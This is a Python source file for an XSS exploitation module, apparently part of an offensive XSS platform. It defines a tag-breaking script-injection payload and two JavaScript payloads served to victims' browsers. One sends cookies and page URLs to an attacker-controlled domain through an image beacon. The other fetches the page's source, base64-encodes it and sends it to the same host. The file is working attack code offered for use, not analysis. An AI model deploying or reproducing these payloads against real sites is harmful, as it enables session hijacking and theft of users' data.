from django.http import HttpResponse
from modules.template.depend.base import BaseTemplate
from rest_framework.response import Response


class XxsTemplate(BaseTemplate):
    info = [{
        "template_info": {
            "name": "XSS",  # 组件名
            "title": "XSS漏洞利用组件",  # 组件展示标题名
            "author": "bios000",  # 组件作者
            "type": 0,  # 组件类型，1是监听0是利用
            "desc": "",  # 组件介绍
            "desc_url": "",  # 组件使用说明链接
            "choice_type": 1,  # 组件选择类型0是单选，1是多选
            "payload": "</tExtArEa>\'\"><sCRiPt sRC=//{domain}/{key}></sCrIpT>",
            "file_name": "xss.py"
        },
        "item_info": [{
            "name": "xss_get_cookie",
            "config": [],
        },
            {
                "name": "xss_get_page_code",
                "config": [],
            }
        ]
    }]

    def __init__(self):
        super().__init__()
        self.key = None

    def xss_get_cookie(self, item):
        """
        获取cookie
        """
        get_cookie_code = """(function(){
     (new Image()).src='http://{{domain}}/{{key}}?message='+escape((function(){
      try{
       return '{"path"'+':'+'"'+document.location.href+'"'
      }catch(e){
       return '"path"'+':'+'""'
      }
     })
     ())+','+escape((function(){
      try{
       return '"toplocation"'+':'+'"'+top.location.href+'"'
      }catch(e){
       return '"toplocation"'+':'+'""'
      }
     })
     ())+','+escape((function(){
      try{
       return '"cookie"'+':'+'"'+document.cookie+'"'
      }catch(e){
       return '"cookie"'+':'+'""'
      }
     })
     ())+','+escape((function(){
      try{
       return '"opener"'+':'+(window.opener && window.opener.location.href)?'"'+window.opener.location.href+'"}':'""}'
      }catch(e){
       return '"opener"'+':'+'""}'
      }
     })());
    })();"""
        return self.replace_code(get_cookie_code)

    def xss_get_page_code(self, item):
        """
        获取源码
        """
        get_page_code = """var cr;
if (document.charset) {
  cr = document.charset
} else if (document.characterSet) {
  cr = document.characterSet
};
function createXmlHttp() {
  if (window.XMLHttpRequest) {
    xmlHttp = new XMLHttpRequest()
  } else {
    var MSXML = new Array('MSXML2.XMLHTTP.5.0', 'MSXML2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP', 'Microsoft.XMLHTTP');
    for (var n = 0; n < MSXML.length; n++) {
      try {
        xmlHttp = new ActiveXObject(MSXML[n]);
        break
      } catch (e) {
      }
    }
  }
}
createXmlHttp();
xmlHttp.onreadystatechange = writeSource;
var url = window.location.href;
xmlHttp.open('GET', url, true);
xmlHttp.send(null);
function writeSource() {
  if (xmlHttp.readyState == 4) {
      var code = BASE64.encoder(xmlHttp.responseText);
      //xssPost('https://{{domain}}/{{key}}?message='+code);
	  const Http = new XMLHttpRequest();
	  const url='https://{{domain}}/{{key}}?message='+code;
	  Http.open("GET", url);
      Http.send();
  }
}

  function xssPost(url, postStr) {
    var de;
    de = document.body.appendChild(document.createElement('iframe'));
    de.src = 'about:blank';
    de.height = 1;
    de.width = 1;
    de.contentDocument.write('<form method="POST" action="' + url + '"><input name="code" value="' + postStr + '"/></form>');
    de.contentDocument.forms[0].submit();
    de.style.display = 'none';
}
/**
 *可以和java的BASE64编码和解码互相转化
 */
(function(){
        var BASE64_MAPPING = [
                'A','B','C','D','E','F','G','H',
                'I','J','K','L','M','N','O','P',
                'Q','R','S','T','U','V','W','X',
                'Y','Z','a','b','c','d','e','f',
                'g','h','i','j','k','l','m','n',
                'o','p','q','r','s','t','u','v',
                'w','x','y','z','0','1','2','3',
                '4','5','6','7','8','9','+','/'
        ];

        /**
         *ascii convert to binary
         */
        var _toBinary = function(ascii){
                var binary = new Array();
                while(ascii > 0){
                        var b = ascii%2;
                        ascii = Math.floor(ascii/2);
                        binary.push(b);
                }
                /*
                var len = binary.length;
                if(6-len > 0){
                        for(var i = 6-len ; i > 0 ; --i){
                                binary.push(0);
                        }
                }*/
                binary.reverse();
                return binary;
        };

        /**
         *binary convert to decimal
         */
        var _toDecimal  = function(binary){
                var dec = 0;
                var p = 0;
                for(var i = binary.length-1 ; i >= 0 ; --i){
                        var b = binary[i];
                        if(b == 1){
                                dec += Math.pow(2 , p);
                        }
                        ++p;
                }
                return dec;
        };

        /**
         *unicode convert to utf-8
         */
        var _toUTF8Binary = function(c , binaryArray){
                var mustLen = (8-(c+1)) + ((c-1)*6);
                var fatLen = binaryArray.length;
                var diff = mustLen - fatLen;
                while(--diff >= 0){
                        binaryArray.unshift(0);
                }
                var binary = [];
                var _c = c;
                while(--_c >= 0){
                        binary.push(1);
                }
                binary.push(0);
                var i = 0 , len = 8 - (c+1);
                for(; i < len ; ++i){
                        binary.push(binaryArray[i]);
                }

                for(var j = 0 ; j < c-1 ; ++j){
                        binary.push(1);
                        binary.push(0);
                        var sum = 6;
                        while(--sum >= 0){
                                binary.push(binaryArray[i++]);
                        }
                }
                return binary;
        };

        var __BASE64 = {
                        /**
                         *BASE64 Encode
                         */
                        encoder:function(str){
                                var base64_Index = [];
                                var binaryArray = [];
                                for(var i = 0 , len = str.length ; i < len ; ++i){
                                        var unicode = str.charCodeAt(i);
                                        var _tmpBinary = _toBinary(unicode);
                                        if(unicode < 0x80){
                                                var _tmpdiff = 8 - _tmpBinary.length;
                                                while(--_tmpdiff >= 0){
                                                        _tmpBinary.unshift(0);
                                                }
                                                binaryArray = binaryArray.concat(_tmpBinary);
                                        }else if(unicode >= 0x80 && unicode <= 0x7FF){
                                                binaryArray = binaryArray.concat(_toUTF8Binary(2 , _tmpBinary));
                                        }else if(unicode >= 0x800 && unicode <= 0xFFFF){//UTF-8 3byte
                                                binaryArray = binaryArray.concat(_toUTF8Binary(3 , _tmpBinary));
                                        }else if(unicode >= 0x10000 && unicode <= 0x1FFFFF){//UTF-8 4byte
                                                binaryArray = binaryArray.concat(_toUTF8Binary(4 , _tmpBinary));
                                        }else if(unicode >= 0x200000 && unicode <= 0x3FFFFFF){//UTF-8 5byte
                                                binaryArray = binaryArray.concat(_toUTF8Binary(5 , _tmpBinary));
                                        }else if(unicode >= 4000000 && unicode <= 0x7FFFFFFF){//UTF-8 6byte
                                                binaryArray = binaryArray.concat(_toUTF8Binary(6 , _tmpBinary));
                                        }
                                }

                                var extra_Zero_Count = 0;
                                for(var i = 0 , len = binaryArray.length ; i < len ; i+=6){
                                        var diff = (i+6)-len;
                                        if(diff == 2){
                                                extra_Zero_Count = 2;
                                        }else if(diff == 4){
                                                extra_Zero_Count = 4;
                                        }
                                        //if(extra_Zero_Count > 0){
                                        //      len += extra_Zero_Count+1;
                                        //}
                                        var _tmpExtra_Zero_Count = extra_Zero_Count;
                                        while(--_tmpExtra_Zero_Count >= 0){
                                                binaryArray.push(0);
                                        }
                                        base64_Index.push(_toDecimal(binaryArray.slice(i , i+6)));
                                }

                                var base64 = '';
                                for(var i = 0 , len = base64_Index.length ; i < len ; ++i){
                                        base64 += BASE64_MAPPING[base64_Index[i]];
                                }

                                for(var i = 0 , len = extra_Zero_Count/2 ; i < len ; ++i){
                                        base64 += '=';
                                }
                                return base64;
                        },
                        /**
                         *BASE64  Decode for UTF-8
                         */
                        decoder : function(_base64Str){
                                var _len = _base64Str.length;
                                var extra_Zero_Count = 0;
                                /**
                                 *计算在进行BASE64编码的时候，补了几个0
                                 */
                                if(_base64Str.charAt(_len-1) == '='){
                                        //alert(_base64Str.charAt(_len-1));
                                        //alert(_base64Str.charAt(_len-2));
                                        if(_base64Str.charAt(_len-2) == '='){//两个等号说明补了4个0
                                                extra_Zero_Count = 4;
                                                _base64Str = _base64Str.substring(0 , _len-2);
                                        }else{//一个等号说明补了2个0
                                                extra_Zero_Count = 2;
                                                _base64Str = _base64Str.substring(0 , _len - 1);
                                        }
                                }

                                var binaryArray = [];
                                for(var i = 0 , len = _base64Str.length; i < len ; ++i){
                                        var c = _base64Str.charAt(i);
                                        for(var j = 0 , size = BASE64_MAPPING.length ; j < size ; ++j){
                                                if(c == BASE64_MAPPING[j]){
                                                        var _tmp = _toBinary(j);
                                                        /*不足6位的补0*/
                                                        var _tmpLen = _tmp.length;
                                                        if(6-_tmpLen > 0){
                                                                for(var k = 6-_tmpLen ; k > 0 ; --k){
                                                                        _tmp.unshift(0);
                                                                }
                                                        }
                                                        binaryArray = binaryArray.concat(_tmp);
                                                        break;
                                                }
                                        }
                                }

                                if(extra_Zero_Count > 0){
                                        binaryArray = binaryArray.slice(0 , binaryArray.length - extra_Zero_Count);
                                }

                                var unicode = [];
                                var unicodeBinary = [];
                                for(var i = 0 , len = binaryArray.length ; i < len ; ){
                                        if(binaryArray[i] == 0){
                                                unicode=unicode.concat(_toDecimal(binaryArray.slice(i,i+8)));
                                                i += 8;
                                        }else{
                                                var sum = 0;
                                                while(i < len){
                                                        if(binaryArray[i] == 1){
                                                                ++sum;
                                                        }else{
                                                                break;
                                                        }
                                                        ++i;
                                                }
                                                unicodeBinary = unicodeBinary.concat(binaryArray.slice(i+1 , i+8-sum));
                                                i += 8 - sum;
                                                while(sum > 1){
                                                        unicodeBinary = unicodeBinary.concat(binaryArray.slice(i+2 , i+8));
                                                        i += 8;
                                                        --sum;
                                                }
                                                unicode = unicode.concat(_toDecimal(unicodeBinary));
                                                unicodeBinary = [];
                                        }
                                }
                                return unicode;
                        }
        };

        window.BASE64 = __BASE64;
})();
        """
        return self.replace_code(get_page_code)

    def replace_code(self, code=""):
        """
        替换code
        """
        code_ = code.replace("{{domain}}", self.domain).replace("{{key}}", self.key)
        return code_

    def generate(self, key, config):
        code = ''
        self.key = key
        try:
            for i in config:
                item_name = i["name"]
                for name in self.__dir__():
                    if name == item_name:
                        code = code + getattr(self, name)(i)
            return HttpResponse(code, content_type='application/x-javascript')
        except Exception as e:
            import traceback
            traceback.print_exc()
            return Response({'status': 'false', 'message': '操作失败'})
